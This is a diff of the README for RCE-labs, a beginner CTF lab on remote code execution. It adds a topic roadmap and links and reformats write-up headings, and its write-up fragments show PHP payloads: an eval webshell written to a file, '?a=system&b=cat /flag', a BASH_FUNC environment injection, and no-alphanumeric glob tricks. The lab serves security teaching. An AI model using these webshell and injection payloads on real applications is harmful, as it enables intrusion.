@@ -1,6 +1,40 @@
-# RCE-labs
 
-靶场内容(还将继续持续更新)：  
+
+## About
+
+> 【hello-ctf.com 基础靶场计划】，访问 [[hello-ctf.com 配套靶场]](https://hello-ctf.com/hc-labs/)  探索更多靶场。
+
+RCE-labs 一个想帮你收集所有 RCE 技巧的靶场。
+
+靶场更新计划：
+
+> 由于靶场偏向新手向，所以前期会侧重在基础的命令/代码执行以及Bypass技巧上，对于RCE类型这一分类会尽可能的做到全面性，由于作者本身实力有限并不会深入研究，如果师傅们有好的建议欢迎在issue中提出。
+
+代码/命令执行基础概念
+
+命令执行 - 基于终端特性的绕过
+
+代码执行 - 基于PHP特性的执行手法或绕过手法
+
+代码执行 - 基于Java特性的执行手法或绕过手法（JNDI注入，表达式注入）
+
+RCE类型 - 文件写入导致的RCE
+
+RCE类型 - 文件上传导致的RCE
+
+RCE类型 - 文件包含导致的RCE
+
+RCE类型 - SQL注入导致的RCE
+
+RCE类型 - 模板注入导致的RCE（Python，PHP）
+
+RCE类型 - 反序列化导致的RCE（PHP，Java，Python，Nodejs）
+
+RCE类型 - 缓冲区溢出导致的RCE
+
+目前关卡信息及内容如下表：
+
+> 内容还在持续更新中....欢迎 Pr or issue。
 
 | 关卡号  | 类别                         | 内容                                             |
 |---------|------------------------------|--------------------------------------------------|
@@ -33,6 +67,13 @@
 | Level 26| PHP 特性                      | 无字母数字的代码执行                             |
 | Level 27| RCE类型                          | 模板注入导致的RCE                                |
 
+## 参考&推荐的材料
+
+[先知社区 - RCE宝典](https://xz.aliyun.com/news/13873)
+
+[CTFshow - RCE极限大挑战](https://dqgom7v7dl.feishu.cn/docx/YM0wdvMX2okGjbxlfz1c9ArwnE4)
+
+[CTFshow - 极限命令执行](https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc)
 
 ## 题目部署
 
@@ -48,13 +89,11 @@ git clone https://github.com/ProbiusOfficial/RCE-labs.git
 
 题目已上线 [【青少年CTF平台】](https://www.qsnctf.com/) 可选择分类中的 **训练/靶场** 或直接搜索 **RCE-labs**：
 
-题目已上线 [【CTFPLUS】](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1911706025656848384) 题集或前往[公开题目](https://www.ctfplus.cn/learning/problem/problem-bank)搜索标签 RCE-labs 或直接搜索 RCE-labs：
+题目已上线 [【CTFPLUS】](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1911706025656848384) 题集或前往[公开题目](https://www.ctfplus.cn/learning/problem/problem-bank)搜索标签 **RCE-labs** 或直接搜索 **RCE-labs**：
 
-![47c1f88bb8932839695bb86a50c4fa8f](https://github.com/user-attachments/assets/7c970ee0-186b-4281-8f0a-eace7d905993)
-
-![QQ_1742633138562](https://github.com/user-attachments/assets/1f10cb12-dc94-4354-b391-182c002ed62a)
-
-![image](https://github.com/user-attachments/assets/c21d0880-2b18-40b6-9e42-8416c1097335)
+> 【hello-ctf.com 基础靶场计划】欢迎任何CTF平台将题目加入到 **非盈利** 题库中用于CTF学习，欢迎师傅们来互换友链。
+>
+> 如有相关需求，可以通过微信联系我：ProbiusProtoss
 
 
 ## WriteUp
@@ -708,7 +747,7 @@ foreach($_REQUEST['a'] as $key => $val) {
 ?envs[BASH_FUNC_echo%25%25]=()%20{%20cat%20/flag;%20}
 ```
 
-Level 19 : 文件写入导致的RCE 
+### Level 19 : 文件写入导致的RCE 
 
 | 函数                | 说明                                                         | 示例代码                                                     |
 | ------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
@@ -716,26 +755,25 @@ Level 19 : 文件写入导致的RCE
 | `fwrite/fputs`      | 向一个打开的文件流写入数据，适用于需要更细粒度的控制文件操作的场景。 | `$fp = fopen('example.php', 'w'); fwrite($fp, '<?php eval($_GET[helloctf]); ?>'); fclose($fp);` |
 | `fprintf`           | 类似于 `fwrite`，但提供格式化功能，允许按照特定格式写入数据到文件流。适用于需要格式化写入的场景。 | `$fp = fopen('example.php', 'w'); fprintf($fp, '<?php eval($_GET[helloctf]); ?>'); fclose($fp);` |
 
-Level 20 : 文件上传导致的RCE 
+###  Level 20 : 文件上传导致的RCE 
 
 没有做任何waf 直接上传webshell执行命令即可
 
-
-Level 21 : 文件包含导致的RCE 
-
+### Level 21 : 文件包含导致的RCE 
 
 
-Level 22 : PHP 特性 - 动态调用 
+
+### Level 22 : PHP 特性 - 动态调用 
 
 ```
 ?a=system&b=cat /flag
 ```
 
-Level 23 : PHP 特性 - 自增
+### Level 23 : PHP 特性 - 自增
 
  
 
-Level 24 : PHP 特性 - 无参命令执行 
+### Level 24 : PHP 特性 - 无参命令执行 
 
 ```
 ?code=var_dump(scandir(current(localeconv())));
@@ -749,11 +787,11 @@ Level 24 : PHP 特性 - 无参命令执行
 
 `array_rand(array_flip())`，`array_flip()`是交换数组的键和值，`array_rand()`是随机返回一个数组,多刷新几次就出来了
 
-Level 25 : PHP 特性 - 取反绕过 
+### Level 25 : PHP 特性 - 取反绕过 
 
 上一题的payload，反转完了多刷新几次就得到了get_flag.php
 
-Level 26 : PHP 特性 - 无字母数字的代码执行
+### Level 26 : PHP 特性 - 无字母数字的代码执行
 
 两种解法
 
@@ -828,7 +866,7 @@ code=?><?=`??? ???/???/????/???_????.???`?>
 
 都抓不到flag 或者get_flag.php
 
-Level 27 : PHP - 模板注入导致的RCE
+### Level 27 : PHP - 模板注入导致的RCE
 
 idekctf 2024 [idekCTF 2024 报道 - Hamayan Hamayan](https://blog.hamayanhamayan.com/entry/2024/08/20/092636)
 
